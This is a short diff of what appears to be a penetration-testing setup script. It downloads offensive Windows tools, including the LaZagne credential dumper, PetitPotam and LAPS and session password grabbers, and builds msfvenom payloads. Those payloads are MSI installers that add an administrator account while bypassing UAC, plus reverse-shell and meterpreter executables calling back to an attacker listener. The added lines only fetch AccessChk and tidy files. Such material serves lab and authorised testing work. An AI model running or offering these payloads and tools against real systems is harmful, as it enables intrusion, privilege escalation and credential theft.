@@ -137,6 +137,9 @@ wget https://github.com/topotam/PetitPotam/raw/main/PetitPotam.exe
 wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
 wget https://github.com/kfosaaen/Get-LAPSPasswords/blob/master/Get-LAPSPasswords.ps1
 wget https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
+wget https://download.sysinternals.com/files/AccessChk.zip
+unzip AccessChk.zip
+rm -f Eula.txt
 
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi-nouac -o alwe-nouac.msi #No uac format
 msfvenom -p windows/adduser USER=nqqb PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
@@ -144,6 +147,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST='tun0' LPORT=443 msi -o reverse_
 msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 msi -o reverse.msi
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST='tun0' LPORT=443 -f exe > meterpreter_x64.exe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST='tun0' LPORT=443 -f exe > meterpreter.exe
+
+
 
 rm -f *.zip *.gz
 
